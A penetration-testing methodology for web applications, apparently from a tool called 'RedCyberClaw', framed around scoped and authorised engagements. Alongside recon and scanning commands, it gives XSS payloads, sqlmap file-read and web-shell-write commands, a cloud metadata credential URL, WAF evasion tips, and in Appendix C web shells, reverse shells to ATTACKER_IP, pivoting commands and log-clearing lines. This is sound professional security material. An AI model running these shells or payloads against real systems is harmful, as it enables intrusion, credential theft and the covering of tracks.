# RedCyberClaw Master Web Assessment Methodology

## Overview
This document outlines the official, comprehensive web application penetration testing methodology for the RedCyberClaw framework. It combines the structured, depth-first component analysis defined in the Web Application Hacker's Handbook (WAHH) with the modern, breadth-first reconnaissance tactics from The Bug Hunter's Methodology (TBHM).

The methodology is divided into 10 distinct, sequential phases:
* Phase 0: Scoping & Preparation
* Phase 1: Passive Reconnaissance
* Phase 2: Active Reconnaissance
* Phase 3: Authentication Testing
* Phase 4: Authorization Testing
* Phase 5: Injection Testing
* Phase 6: Business Logic
* Phase 7: API Testing
* Phase 8: Client-Side Testing
* Phase 9: Infrastructure Testing
* Phase 10: Reporting & Remediation

---

## Phase 0: Scoping & Preparation
Before any testing begins, the scope, boundaries, and rules of engagement must be rigidly defined.

### 0.1 Target Definition
* Verify all in-scope top-level domains (TLDs) and subdomains.
* Identify out-of-scope assets (e.g., third-party integrations, marketing sites).
* Establish communication channels with the client/target organization.
* Obtain emergency contact information for critical service disruptions.

### 0.2 Access and Credentials
* Ensure provisioning of multiple account roles (e.g., Admin, User, Read-Only).
* Document test credentials in a secure password manager.
* Configure static IP addresses if allowlisting is required.
* Establish VPN tunnels or jump boxes if testing internal environments.

### 0.3 Tool Calibration
* Update vulnerability databases (e.g., Nuclei templates, Nmap scripts).
* Configure Burp Suite / OWASP ZAP projects.
* Load custom wordlists tailored to the target's technology stack.
* Set up automated logging and evidence collection mechanisms.

---

## Phase 1: Passive Reconnaissance
The objective of Phase 1 is to gather as much intelligence about the target as possible without directly interacting with the target's infrastructure in an intrusive manner.

### 1.1 ASN & IP Block Discovery
Identify the netblocks owned by the target.
```bash
# Retrieve ASN via BGP toolkit or whois
whois -h whois.radb.net -- '-i origin AS12345' | grep -Eo "([0-9.]+){4}/[0-9]+" | sort -u
# Amass Intel
amass intel -org "Target Company"
```

### 1.2 Subdomain Enumeration (Passive)
Discover subdomains using public datasets and certificate transparency logs.
```bash
# Subfinder (Passive)
subfinder -d target.com -all -silent > subdomains.txt
# Amass Enum
amass enum -passive -d target.com -o amass_subdomains.txt
# CertSpotter / crt.sh
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u >> subdomains.txt
```

### 1.3 Wayback Machine & URL History
Extract historical endpoints and parameters from internet archives.
```bash
# Waybackurls
cat subdomains.txt | waybackurls > wayback.txt
# Gau (Get All URLs)
cat subdomains.txt | gau --threads 10 >> gau_urls.txt
# Hakrawler
cat subdomains.txt | hakrawler >> hakrawler.txt
```

### 1.4 Dorking (Search Engine Recon)
Utilize advanced search operators to find exposed sensitive information.
* **Google Dorks**:
  * `site:target.com ext:php | ext:aspx | ext:jsp`
  * `site:target.com inurl:admin | inurl:login`
  * `site:target.com "index of /"`
* **GitHub Dorks**:
  * `"target.com" API_KEY`
  * `"target.com" password`
  * `org:TargetCompany "DB_PASSWORD"`
* **Shodan / Censys**:
  * `ssl.cert.subject.cn:"*.target.com"`
  * `hostname:"target.com" port:22`

### 1.5 OSINT & Credential Leaks
Search breach databases for compromised employee credentials.
* **DeHashed / HaveIBeenPwned**: Search for `@target.com` emails.
* **Pastebin**: Search for internal domain names or source code snippets.

### 1.6 Tech Fingerprinting & JavaScript Analysis
Identify the technology stack and extract endpoints from client-side code.
```bash
# Wappalyzer CLI / Webanalyze
webanalyze -host target.com -crawl 1
# httpx for live host identification
cat subdomains.txt | httpx -silent -tech-detect -status-code -title > live_hosts.txt
# LinkFinder for JS extraction
python3 LinkFinder.py -i https://target.com/app.js -o cli
# SecretFinder
python3 SecretFinder.py -i https://target.com/app.js -o cli
```

---

## Phase 2: Active Reconnaissance
Direct interaction with the target to map the attack surface, discover hidden directories, and identify active services.

### 2.1 Port Scanning & Service Enumeration
Scan discovered IP addresses for open ports and identify running services.
```bash
# Naabu (Fast Port Scan)
naabu -iL live_hosts.txt -p - -silent > open_ports.txt
# Nmap (Service Versioning)
nmap -iL open_ports.txt -sV -sC -p- -T4 -oN nmap_full.txt
# Masscan
masscan -iL live_hosts.txt -p0-65535 --rate 10000 -oG masscan.log
```

### 2.2 Directory & File Brute Forcing
Discover unlinked content, administrative panels, and backup files.
```bash
# ffuf (Fast Web Fuzzer)
ffuf -w /path/to/wordlist.txt -u https://target.com/FUZZ -mc 200,301,302,403 -c -v
# Feroxbuster
feroxbuster -u https://target.com -w /path/to/wordlist.txt -t 50 -d 2
# Gobuster
gobuster dir -u https://target.com -w /path/to/wordlist.txt -t 50 -x php,html,txt,bak
```

### 2.3 Parameter Mining
Discover hidden parameters that might be vulnerable to injection or logic flaws.
```bash
# Arjun
arjun -u https://target.com/endpoint -m GET -w /path/to/params.txt
# x8
x8 -u "https://target.com/endpoint" -w /path/to/params.txt
```

### 2.4 Spidering & Crawling
Map the application structure comprehensively.
```bash
# Katana
katana -u https://target.com -jc -d 3 -o katana_urls.txt
# GoSpider
gospider -S live_hosts.txt -o output_dir -c 10 -d 2
```

---

## Phase 3: Authentication Testing
Evaluate the mechanisms that verify user identity.

### 3.1 Brute Force & Dictionary Attacks
Test login portals against common or leaked passwords.
```bash
# Hydra
hydra -l admin -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=Login Failed"
# Burp Intruder (Pitchfork / Cluster Bomb)
```

### 3.2 Session Management
Analyze how the application handles session tokens.
* Check cookie flags (`HttpOnly`, `Secure`, `SameSite`).
* Test session entropy and predictability.
* Verify session invalidation upon logout or timeout.
* Test for concurrent logins and session fixation.

### 3.3 MFA (Multi-Factor Authentication) Bypass
Attempt to bypass or manipulate MFA mechanisms.
* **Response Manipulation**: Change `{"success": false}` to `{"success": true}` in the intercepting proxy.
* **Direct Endpoint Access**: Navigate directly to `/dashboard` without completing the MFA step.
* **OTP Brute Force**: Test for lack of rate limiting on the OTP input.
* **Token Reuse**: Attempt to reuse a previously valid OTP.

### 3.4 OAuth Flows
Examine third-party authentication integrations.
* Manipulate the `redirect_uri` parameter to steal authorization codes.
* Test for missing `state` parameter (CSRF on OAuth).
* Attempt implicit grant flow abuse.

### 3.5 JWT (JSON Web Token) Attacks
Analyze and exploit JWT implementations.
* **None Algorithm**: Change the algorithm header to `none` and remove the signature.
* **Key Confusion**: Force the server to use a public key (RSA) as a symmetric key (HMAC).
* **Signature Stripping**: Send the token without the signature section.
* **Weak Secrets**: Brute force the HMAC secret using hashcat.
  ```bash
  hashcat -m 16500 jwt.txt rockyou.txt
  ```

---

## Phase 4: Authorization Testing
Assess what an authenticated user is allowed to do.

### 4.1 IDOR (Insecure Direct Object Reference)
Attempt to access resources belonging to other users.
* Increment or manipulate user IDs, order numbers, or document IDs in the URL or API body.
* Use tools like **Autorize** (Burp Extension) to automate detection.
* Test REST endpoints: `GET /api/v1/users/123` -> change to `124`.

### 4.2 Privilege Escalation
Test boundaries between different user roles.
* **Vertical**: A low-privileged user attempts to access administrative functions (e.g., `/admin/deleteUser`).
* **Horizontal**: A user attempts to perform actions on behalf of another user at the same privilege level.

### 4.3 Role-Based Access Control (RBAC) Bypass
Manipulate requests to bypass role checks.
* Alter custom HTTP headers (e.g., `X-Admin: true`).
* Modify client-side role definitions if improperly validated on the server.

### 4.4 HTTP Parameter Pollution (HPP)
Supply multiple instances of the same parameter to confuse the application logic.
* `GET /api/transfer?amount=100&to=attacker&to=victim`

---

## Phase 5: Injection Testing
Test for vulnerabilities where untrusted data is sent to an interpreter as part of a command or query.

### 5.1 SQL Injection (SQLi)
* **Testing Techniques**: Inject `'`, `"`, `\`, `;`, `ORDER BY`, `UNION SELECT`.
* **Tools**:
  ```bash
  sqlmap -u "https://target.com/page?id=1" --dbs --batch
  sqlmap -r request.txt -p target_param --level 5 --risk 3
  ```
* **Types**: Error-based, Union-based, Boolean-based blind, Time-based blind.

### 5.2 Cross-Site Scripting (XSS)
* **Reflected**: Inject payloads that execute immediately in the victim's browser.
  * `<script>alert(document.domain)</script>`
  * `"><img src=x onerror=prompt(1)>`
* **Stored**: Inject payloads that are saved to the database and executed when viewed by other users.
* **DOM-based**: Analyze sinks (`innerHTML`, `eval()`) and sources (`location.hash`, `document.referrer`) in JavaScript.
* **Blind XSS**: Inject payloads using tools like XSS Hunter to catch out-of-band execution (e.g., in an admin panel).

### 5.3 Server-Side Template Injection (SSTI)
Identify template engines and inject execution payloads.
* Example test: `${7*7}` or `{{7*7}}` or `<%= 7*7 %>`.
* Remediation: Avoid rendering user input directly in templates.

### 5.4 Command Injection
Inject OS commands into application input.
* Use command separators: `;`, `|`, `&&`, `$()`, `` ` ``.
* **Tools**:
  ```bash
  commix --url="https://target.com/ping?ip=127.0.0.1" --batch
  ```

### 5.5 LDAP & NoSQL Injection
* **LDAP**: Inject `*`, `)`, `(` to bypass authentication filters.
* **NoSQL**: Inject MongoDB operators like `{"$ne": null}` or `{"$gt": ""}`.

### 5.6 Header Injection (CRLF / Host)
* **CRLF**: Inject carriage return and line feed characters (`%0d%0a`) to set arbitrary headers or split HTTP responses.
* **Host Header**: Manipulate the `Host` header to cause cache poisoning or password reset poisoning.

---

## Phase 6: Business Logic
Identify flaws in the intended workflow of the application.

### 6.1 Race Conditions
Exploit time-of-check to time-of-use (TOCTOU) flaws using single-packet attacks or high-concurrency requests.
* Use **Turbo Intruder** with the `race-single-packet-attack.py` script.
* Test on coupon redemption, fund transfers, and voting mechanisms.

### 6.2 Price Manipulation
Modify the cost of items in the shopping cart.
* Alter price parameters in POST requests or manipulate the quantity to negative values.

### 6.3 Workflow Bypass
Skip required steps in a multi-step process.
* Navigate directly to the final checkout confirmation page without providing payment details.

### 6.4 Coupon / Discount Abuse
Test limitations on promotional codes.
* Apply the same coupon multiple times.
* Combine exclusive coupons.

---

## Phase 7: API Testing
Focus on vulnerabilities specific to Application Programming Interfaces.

### 7.1 REST API
* Test for excessive data exposure (e.g., returning full user objects instead of just IDs).
* Fuzz for hidden versions (`/v1/`, `/v2/`, `/v3/`) or undocumented endpoints.

### 7.2 GraphQL
* Ensure Introspection queries are disabled in production.
  ```json
  {"query": "\n    query IntrospectionQuery {\n      __schema {\n        queryType { name }\n        mutationType { name }\n        subscriptionType { name }\n        types {\n          ...FullType\n        }\n        directives {\n          name\n          description\n          locations\n          args {\n            ...InputValue\n          }\n        }\n      }\n    }\n    \n    fragment FullType on __Type {\n      kind\n      name\n      description\n      fields(includeDeprecated: true) {\n        name\n        description\n        args {\n          ...InputValue\n        }\n        type {\n          ...TypeRef\n        }\n        isDeprecated\n        deprecationReason\n      }\n      inputFields {\n        ...InputValue\n      }\n      interfaces {\n        ...TypeRef\n      }\n      enumValues(includeDeprecated: true) {\n        name\n        description\n        isDeprecated\n        deprecationReason\n      }\n      possibleTypes {\n        ...TypeRef\n      }\n    }\n    \n    fragment InputValue on __InputValue {\n      name\n      description\n      type { ...TypeRef }\n      defaultValue\n    }\n    \n    fragment TypeRef on __Type {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n          ofType {\n            kind\n            name\n            ofType {\n              kind\n              name\n              ofType {\n                kind\n                name\n                ofType {\n                  kind\n                  name\n                  ofType {\n                    kind\n                    name\n                  }\n                }\n              }\n            }\n          }\n        }\n      }\n    }\n  "}
  ```
* Test query batching to bypass rate limits or perform brute-force attacks.
* Attempt alias overloading to cause denial of service.

### 7.3 gRPC
* Use tools like `grpcurl` or Burp Suite extensions to interact with protobuf definitions.
* Check if server reflection is enabled.

### 7.4 CORS (Cross-Origin Resource Sharing)
* Test for overly permissive `Access-Control-Allow-Origin` headers.
* Check if the application reflects arbitrary origins or accepts the `null` origin.
* Verify `Access-Control-Allow-Credentials: true` misconfigurations.

### 7.5 Rate Limiting
* Test endpoints for rate limiting controls.
* Attempt to bypass limits using `X-Forwarded-For`, `X-Real-IP`, or varying the `User-Agent`.

---

## Phase 8: Client-Side Testing
Assess vulnerabilities executed within the user's browser context.

### 8.1 DOM XSS
* Deeply analyze JavaScript code using tools like DOMInvader.
* Trace the flow from untrusted sources to dangerous execution sinks.

### 8.2 postMessage Vulnerabilities
* Identify listeners (`window.addEventListener('message', ...)`) that lack origin validation.
* Craft malicious pages to send unauthorized messages to the target application.

### 8.3 Prototype Pollution
* Analyze client-side object manipulation.
* Inject `__proto__` or `constructor.prototype` properties into JSON payloads to alter application behavior.

### 8.4 Clickjacking / UI Redressing
* Verify the presence of `X-Frame-Options` or Content Security Policy (`frame-ancestors`) headers.
* Attempt to iframe sensitive state-changing pages.

---

## Phase 9: Infrastructure Testing
Evaluate the underlying servers and cloud services hosting the application.

### 9.1 SSRF (Server-Side Request Forgery)
* Force the server to make requests to internal resources.
* Attempt internal port scanning (`http://127.0.0.1:22`).
* Extract cloud metadata (e.g., AWS IMDSv1/v2 credentials).
  ```bash
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
  ```

### 9.2 Open Redirects
* Manipulate parameters like `redirect_url` or `next` to point to an attacker-controlled domain.
* Chain open redirects with other vulnerabilities (e.g., stealing OAuth tokens).

### 9.3 Subdomain Takeover
* Identify dangling DNS records pointing to unclaimed cloud services (e.g., GitHub Pages, AWS S3, Heroku).
* Register the resource to gain control of the subdomain.
* Use tools like `subjack` or `nuclei` for automated detection.

### 9.4 S3 Buckets / Cloud Storage Misconfigurations
* Discover publicly accessible buckets using `lazy_s3` or `s3scanner`.
* Test for unauthorized read/write permissions.
  ```bash
  aws s3 ls s3://target-bucket-name --no-sign-request
  aws s3 cp test.txt s3://target-bucket-name/ --no-sign-request
  ```

---

## Phase 10: Reporting & Remediation
The final phase involves documenting findings clearly, concisely, and actionable.

### 10.1 Executive Summary
* Provide a high-level overview of the assessment scope, methodology, and key findings tailored for non-technical stakeholders.

### 10.2 Vulnerability Details
* For each finding, include:
  * **Title**: Clear and concise description.
  * **Severity**: Assigned based on CVSS scoring (Critical, High, Medium, Low, Info).
  * **Description**: Detailed explanation of the vulnerability.
  * **Impact**: The potential business or technical consequences if exploited.

### 10.3 Proof of Concept (PoC)
* Provide step-by-step instructions, HTTP requests/responses, and screenshots demonstrating exactly how to reproduce the vulnerability.

### 10.4 Remediation Recommendations
* Offer specific, actionable guidance for developers to fix the issue, including code snippets or configuration changes.

---
*End of Methodology*
## Appendix A: Comprehensive Wordlists and Tool Configurations

### A.1 Essential Wordlists for Directory Bruteforcing
* **SecLists**: The industry standard for discovery.
  * `Discovery/Web-Content/raft-large-directories.txt`
  * `Discovery/Web-Content/raft-large-files.txt`
  * `Discovery/Web-Content/directory-list-2.3-medium.txt`
  * `Discovery/Web-Content/common.txt`
* **Assetnote Wordlists**: Frequently updated, context-specific lists.
  * `httparchive_directories_2023_11_28.txt`
  * `httparchive_php_2023_11_28.txt`
* **Custom Wordlists**: Generated dynamically per engagement based on OSINT.

### A.2 Advanced ffuf Configurations
Fuzzing requires tuning for optimal results and evading basic WAF rules.
```bash
# Basic directory discovery with colorized output and auto-calibration
ffuf -w /path/to/wordlist.txt -u https://target.com/FUZZ -c -ac

# Fuzzing with specific headers (e.g., custom User-Agent, Authorization)
ffuf -w wordlist.txt -u https://target.com/api/FUZZ -H "User-Agent: Mozilla/5.0" -H "Authorization: Bearer <token>"

# Fuzzing POST data for JSON endpoints
ffuf -w params.txt -u https://target.com/api/login -X POST -H "Content-Type: application/json" -d '{"username":"admin", "FUZZ":"password"}'

# Filtering by response size and matching specific status codes
ffuf -w wordlist.txt -u https://target.com/FUZZ -mc 200,301,302 -fs 0,1024

# Using multiple wordlists simultaneously (e.g., for brute-forcing credentials)
ffuf -w users.txt:USER -w passes.txt:PASS -u https://target.com/login -X POST -d "username=USER&password=PASS"
```

### A.3 Nuclei Template Management
Nuclei is critical for fast, signature-based vulnerability scanning.
```bash
# Update templates to the latest version
nuclei -ut

# Run all templates against a list of targets
nuclei -l live_hosts.txt -o nuclei_results.txt

# Run specific tags (e.g., CVEs, exposures, misconfigurations)
nuclei -l live_hosts.txt -tags cve,exposure,misconfig

# Run templates specific to a particular technology (e.g., WordPress)
nuclei -l live_hosts.txt -w workflows/wordpress-workflow.yaml

# Create a custom template for a specific zero-day or finding
# (Save as custom-template.yaml)
id: custom-cve-check
info:
  name: Custom CVE Check
  author: RedCyberClaw
  severity: high
requests:
  - method: GET
    path:
      - "{{BaseURL}}/vulnerable/endpoint"
    matchers:
      - type: word
        words:
          - "vulnerable_indicator_string"
```

### A.4 Nmap Advanced Scanning Profiles
Nmap remains the foundational tool for network reconnaissance.
```bash
# Aggressive scan (OS detection, version detection, script scanning, traceroute)
nmap -A -T4 target.com

# Vulnerability scanning using NSE scripts
nmap -sV --script vuln target.com

# Stealth SYN scan (requires root privileges)
nmap -sS -T4 target.com

# UDP port scanning (often overlooked but critical for certain services like SNMP, DNS)
nmap -sU -T4 -p 53,161,162 target.com

# Firewall evasion techniques (fragmentation, decoys)
nmap -f -D RND:10 target.com
```

### A.5 SQLmap Mastery
Automating SQL injection detection and exploitation.
```bash
# Basic scan
sqlmap -u "https://target.com/page?id=1" --batch

# Scan with a saved HTTP request from Burp Suite
sqlmap -r request.txt --batch

# Force specific database management system (DBMS)
sqlmap -u "https://target.com/page?id=1" --dbms=mysql --batch

# Attempt to read a file from the server
sqlmap -u "https://target.com/page?id=1" --file-read="/etc/passwd"

# Attempt to write a file (e.g., a web shell)
sqlmap -u "https://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Dump the entire database (use with caution)
sqlmap -u "https://target.com/page?id=1" --dump-all --batch
```

### A.6 API Fuzzing Strategies
* **Method Fuzzing**: Send GET, POST, PUT, DELETE, PATCH, OPTIONS to every discovered endpoint.
* **Content-Type Fuzzing**: Change `application/json` to `application/xml`, `text/plain`, or `application/x-www-form-urlencoded` to trigger different parsing logic.
* **Version Fuzzing**: Iterate through `/v1/`, `/v2/`, `/v3/`, `/v0/`, `/vbeta/`, `/internal/`.
* **Parameter Type Fuzzing**: Replace integer IDs with strings, arrays, booleans, or extremely large numbers (integer overflow).

### A.7 WAF Evasion Techniques
* **IP Rotation**: Use tools like `proxychains` or cloud-based proxy networks to rotate source IP addresses.
* **Header Manipulation**: Add headers like `X-Forwarded-For: 127.0.0.1`, `X-Originating-IP: 127.0.0.1`, or `X-Remote-IP: 127.0.0.1` to spoof internal traffic.
* **Payload Encoding**: Double URL encoding, Unicode encoding, or null byte injections (`%00`).
* **Chunked Transfer Encoding**: Split the payload across multiple chunks to bypass signature detection.

### A.8 Reporting Excellence Guidelines
* **Clarity over Complexity**: Explain the impact of the vulnerability in business terms. A critical technical flaw is only critical if it impacts the organization's goals.
* **Reproducibility is Key**: The Proof of Concept (PoC) must be flawless. If the client cannot reproduce it, the finding will be rejected or downgraded.
* **Actionable Remediation**: Do not just say "fix the SQL injection." Provide the specific parameterized query syntax for the framework they are using.
* **Visual Evidence**: Include annotated screenshots or short video clips demonstrating the exploitation process.
* **Secure Delivery**: Deliver the final report via encrypted channels (e.g., PGP email, secure portal).

## Appendix B: Engagement Checklists

### B.1 Pre-Engagement Checklist
- [ ] Scope defined and documented.
- [ ] Rules of Engagement (RoE) signed.
- [ ] Emergency contacts established.
- [ ] Testing window and timezones confirmed.
- [ ] Credentials provisioned and verified.
- [ ] IP allowlisting confirmed (if applicable).
- [ ] Target environment verified (Prod, Staging, QA).

### B.2 Daily Assessment Checklist
- [ ] Verify testing tools are functioning correctly.
- [ ] Monitor log files for unexpected errors or blocks.
- [ ] Document all new findings immediately.
- [ ] Backup project files (Burp state, terminal logs).
- [ ] Communicate any critical findings to the client immediately.

### B.3 Post-Engagement Checklist
- [ ] Ensure all automated scans are stopped.
- [ ] Remove any test accounts, web shells, or modifications made during testing.
- [ ] Finalize the comprehensive report.
- [ ] Conduct a debriefing call with the client.
- [ ] Securely archive or destroy engagement data according to the data retention policy.

## Appendix C: Post-Exploitation & Lateral Movement (Web Context)

While web assessments primarily focus on the application layer, gaining initial access often necessitates a basic understanding of post-exploitation to demonstrate impact.

### C.1 Web Shell Interactions
Once a file upload or RCE vulnerability is confirmed, deploying a web shell is the next step to establish persistence.
* **PHP Base Shell**: `<?php system($_GET['cmd']); ?>`
* **JSP Base Shell**: `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`
* **ASPX Base Shell**: `<%@ Page Language="C#" %><% System.Diagnostics.Process.Start(Request.QueryString["cmd"]); %>`

### C.2 Upgrading to a Reverse Shell
A simple web shell is often insufficient for complex tasks. Upgrading to a full reverse shell is critical.
* **Bash Reverse Shell**: `bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`
* **Python Reverse Shell**: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
* **Netcat Reverse Shell**: `nc -e /bin/sh ATTACKER_IP 4444` (Requires netcat-traditional)

### C.3 Internal Reconnaissance
After obtaining a shell, gather intelligence about the compromised host and its internal network.
* **System Information**: `uname -a`, `cat /etc/os-release`, `hostname`, `id`
* **Network Configuration**: `ip a`, `ifconfig`, `netstat -ano`, `route`, `cat /etc/resolv.conf`
* **Running Processes**: `ps aux`, `top`
* **Scheduled Tasks**: `cat /etc/crontab`, `ls -la /etc/cron.*`
* **User Information**: `cat /etc/passwd`, `cat /etc/shadow`, `lastlog`

### C.4 Privilege Escalation (Linux)
Attempt to elevate privileges to root.
* **Sudo Rights**: `sudo -l` (Check what commands the current user can run as root)
* **SUID Binaries**: `find / -perm -4000 -type f 2>/dev/null` (Look for binaries with the SUID bit set)
* **Kernel Exploits**: Use tools like `linux-exploit-suggester` or `Traitor` to identify potential kernel vulnerabilities.
* **Misconfigured Permissions**: Look for writable files or directories owned by root (e.g., `/etc/passwd`, `/etc/shadow`).

### C.5 Privilege Escalation (Windows)
Attempt to elevate privileges to SYSTEM or Administrator.
* **System Information**: `systeminfo`
* **User Privileges**: `whoami /priv`
* **Service Configurations**: Check for unquoted service paths or insecure service executables.
* **Scheduled Tasks**: `schtasks /query /fo LIST /v`
* **Kernel Exploits**: Use tools like `Windows-Exploit-Suggester` or `Sherlock`.

### C.6 Lateral Movement
Move from the compromised web server to other systems within the internal network.
* **SSH Keys**: Look for private SSH keys in `~/.ssh/id_rsa`.
* **Password Reuse**: Attempt to use cracked or discovered passwords on other internal services (e.g., databases, internal web applications).
* **Port Forwarding / Pivoting**: Use SSH or Chisel to forward traffic from your attacking machine through the compromised host to internal networks.
  ```bash
  # SSH Local Port Forwarding
  ssh -L 8080:INTERNAL_IP:80 user@COMPROMISED_HOST
  
  # Chisel Server (Attacker)
  chisel server -p 8000 --reverse
  
  # Chisel Client (Compromised Host)
  chisel client ATTACKER_IP:8000 R:socks
  ```

### C.7 Data Exfiltration
Demonstrate the ability to extract sensitive data, but always adhere to the Rules of Engagement.
* **Direct Download**: Use a web shell to download files directly.
* **Out-of-Band (OOB)**: Use DNS or HTTP requests to exfiltrate data if outbound traffic is heavily restricted.
* **Archiving**: Compress large amounts of data before exfiltration to save time and bandwidth.
  ```bash
  tar -czvf data.tar.gz /path/to/sensitive/data
  ```

### C.8 Covering Tracks (Simulated)
In a real engagement, cleaning up is crucial. Ensure no artifacts are left behind.
* **Remove Web Shells**: Delete any uploaded scripts or reverse shells.
* **Clear Logs**: (If authorized) `echo "" > /var/log/auth.log`, `history -c`
* **Revert Configuration Changes**: Restore any modified files to their original state.
